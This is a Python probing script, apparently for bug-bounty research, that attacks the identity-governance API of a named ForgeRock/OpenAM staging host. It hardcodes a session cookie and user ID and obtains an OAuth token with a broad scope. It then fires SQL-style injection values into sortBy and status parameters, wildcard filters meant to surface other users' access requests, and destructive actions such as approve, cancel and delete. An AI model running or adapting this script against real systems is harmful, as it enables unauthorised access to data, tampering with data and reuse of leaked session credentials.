# -*- coding: utf-8 -*-
"""AIC 第十八轮:grants/requests 参数注入面系统爆破(抓包新发现)
新面:
  A. grants:sortBy=role.name(字段路径注入)、grantType=role(枚举)、sortDir、pageSize/pageNumber 边界
  B. requests:_status 枚举、_pageSize 边界、targetFilter 深度注入(decision 字段枚举/operator/嵌套)
预期结果表:
  成立 -> 参数校验严格:未知字段/非法值被拒,错误信息无 schema 泄露
  不成立(发现) -> sortBy/grantType/_status 注入改变查询语义、越权数据、错误泄露
"""
import requests, urllib3, json, base64, hashlib, os
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
COOKIE = 'amlbcookie=01; aa942d46ece12ce=tvVfNxaXuVbrr2BzbooZZTz8iTk.*AAJTSQACMDIAAlNLABxZNXdTYkVsVmxPdWdiRlZkeDc3V3doNTJ1VTg9AAR0eXBlAANDVFMAAlMxAAIwMQ..*'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                  'Cookie': COOKIE})

def get_token():
    ver = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode()
    ch = base64.urlsafe_b64encode(hashlib.sha256(ver.encode()).digest()).rstrip(b'=').decode()
    url = (BASE + '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient'
           '&response_type=code&redirect_uri=%s&scope=%s&state=t'
           '&code_challenge=%s&code_challenge_method=S256' % (RU, 'openid fr:iga:*', ch))
    r = S.get(url, timeout=12, verify=False, allow_redirects=False)
    loc = r.headers.get('Location', '')
    code = loc.split('code=')[1].split('&')[0] if 'code=' in loc else None
    if not code:
        print('PKCE authorize failed:', r.status_code, loc[:200])
        return None
    r2 = S.post(BASE + '/am/oauth2/realms/alpha/access_token',
                data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                      'client_id': 'endUserUIClient', 'code_verifier': ver}, timeout=12, verify=False)
    return r2.json().get('access_token')

tok = get_token()
print('token:', tok[:50] if tok else 'NONE')
if not tok:
    raise SystemExit('no token')

S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643', 'Authorization': 'Bearer ' + tok,
                   'Cookie': COOKIE, 'Content-Type': 'application/json'})

def probe(method, path, body=None, label=''):
    kw = {}
    if body is not None:
        kw['json'] = body
    try:
        r = S2.request(method, BASE + path, timeout=12, verify=False, **kw)
        tag = ('  <= ' + label) if label else ''
        print('%-5s %-88s -> %d  %s%s' % (method, path[:88], r.status_code, r.text[:160].replace('\n', ' '), tag))
        return r
    except Exception as e:
        print('%-5s %-88s -> ERR %s' % (method, path[:88], str(e)[:60]))
        return None

print('\n=== A. grants 参数面 ===')
GP = '/iga/governance/user/%s/grants' % MY_ID

print('\n-- A1. grantType 枚举 --')
for gt in ['role', 'roles', 'entitlements', 'applications', 'accountGrant', 'entitlementGrant',
           'access', 'role,entitlements', 'admin', "role'", '']:
    probe('GET', GP + '?pageSize=10&grantType=' + gt, label='grantType=' + gt)

print('\n-- A2. sortBy 注入 --')
for sb in ['role.name', 'userName', 'mail', 'metadata.created', 'metadata.modifiedDate',
           'user.mail', 'item.type', 'keys.userId',
           'role.name,userName', "role.name'", 'role.name)--', 'foobar', 'role.nonexistent',
           'userName;select 1', 'metadata.entityType']:
    probe('GET', GP + '?pageSize=10&sortBy=' + sb, label='sortBy=' + sb)

print('\n-- A3. sortDir / pageSize / pageNumber 边界 --')
for extra in ['sortDir=asc&sortBy=role.name', 'sortDir=desc&sortBy=role.name', 'sortDir=ASC',
              'sortDir=random', 'pageSize=0', 'pageSize=-1', 'pageSize=1', 'pageSize=999999',
              'pageNumber=-1', 'pageNumber=999999', 'pageSize=0&pageNumber=0',
              'sortBy=role.name&sortDir=asc&grantType=role&pageSize=10&pageNumber=0']:
    probe('GET', GP + '?' + extra, label=extra)

print('\n=== B. requests 参数面 ===')
RP = '/iga/governance/user/%s/requests' % MY_ID

print('\n-- B1. _status 枚举 --')
for st in ['in-progress', 'approved', 'denied', 'cancelled', 'completed', 'pending', 'all',
           'requested', 'rejected', '', 'IN-PROGRESS', 'in_progress', "in-progress'"]:
    probe('POST', RP + '?_pageSize=0&_status=' + st + '&_action=search',
          {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': 'decision.status', 'targetValue': st}}], 'operator': 'AND'}},
          label='_status=' + st)

print('\n-- B2. _pageSize / 分页边界 --')
for ps in ['0', '-1', '1', '999999', 'abc']:
    probe('POST', RP + '?_pageSize=' + ps + '&_status=in-progress&_action=search',
          {'targetFilter': {}}, label='_pageSize=' + ps)

print('\n-- B3. targetFilter decision 字段枚举 --')
for tn in ['decision.status', 'decision.id', 'decision.type', 'decision.approver',
           'requester.userName', 'requester.id', 'target.name', 'target.type',
           'role.name', 'application.name', 'request.id', 'request.status',
           'user.userName', 'grant.type', 'metadata.createdDate', 'approval.status']:
    probe('POST', RP + '?_pageSize=0&_status=in-progress&_action=search',
          {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': tn, 'targetValue': '*'}}], 'operator': 'AND'}},
          label='targetName=' + tn)

print('\n-- B4. operator / 嵌套注入 --')
bodies = [
    {'targetFilter': {'operand': [{'operator': 'CONTAINS', 'operand': {'targetName': 'decision.status', 'targetValue': 'progress'}}], 'operator': 'AND'}},
    {'targetFilter': {'operand': [{'operator': 'STARTS_WITH', 'operand': {'targetName': 'decision.status', 'targetValue': 'in'}}], 'operator': 'AND'}},
    {'targetFilter': {'operand': [{'operator': 'NOT_EQUALS', 'operand': {'targetName': 'decision.status', 'targetValue': 'approved'}}], 'operator': 'AND'}},
    {'targetFilter': {'operand': [{'operator': 'GREATER_THAN', 'operand': {'targetName': 'metadata.createdDate', 'targetValue': '2020'}}], 'operator': 'AND'}},
    {'targetFilter': {'operand': [{'operator': 'AND', 'operand': [
        {'operator': 'EQUALS', 'operand': {'targetName': 'decision.status', 'targetValue': 'in-progress'}},
        {'operator': 'EQUALS', 'operand': {'targetName': 'requester.userName', 'targetValue': 'pccp'}}]}], 'operator': 'AND'}},
    {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': 'requester.userName', 'targetValue': 'researcher1643'}}], 'operator': 'AND'}},
    {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': 'requester.userName', 'targetValue': 'pccp'}}], 'operator': 'AND'}},
    {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': 'requester.userName', 'targetValue': '*'}}], 'operator': 'AND'}},
    {'targetFilter': {'operand': [], 'operator': 'AND'}},
    {'targetFilter': {'operand': [{'operator': 'INVALID_OP', 'operand': {'targetName': 'decision.status', 'targetValue': 'x'}}], 'operator': 'AND'}},
]
for b in bodies:
    probe('POST', RP + '?_pageSize=0&_status=in-progress&_action=search', b,
          label='body=' + json.dumps(b, ensure_ascii=False)[:80])

print('\n-- B5. 其他 _action 枚举 --')
for act in ['search', 'create', 'count', 'summary', 'list', 'get', 'cancel', 'approve', 'delete', 'export']:
    probe('POST', RP + '?_pageSize=0&_status=in-progress&_action=' + act,
          {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': 'decision.status', 'targetValue': 'in-progress'}}], 'operator': 'AND'}},
          label='_action=' + act)
